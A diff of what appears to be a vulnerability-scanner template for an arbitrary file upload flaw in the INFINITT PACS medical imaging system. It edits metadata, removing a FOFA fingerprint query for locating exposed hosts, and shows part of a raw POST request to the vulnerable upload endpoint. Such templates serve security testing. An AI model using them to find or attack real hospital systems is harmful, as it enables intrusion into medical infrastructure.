@@ -3,12 +3,8 @@ info:
   name: 英飞达影像存档与通讯PACS系统INFINITT_PACS任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ysdf34fufu5t1vu1'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ysdf34fufu5t1vu1
-    fofa: '"INFINITT" && (icon_hash="1474455751" || icon_hash="702238928")'
 http:
 - raw:
   - 'POST /webservices/WebJobUpload.asmx HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Connection: close
-
-
 
 
     <?xml version="1.0" encoding="utf-8"?>
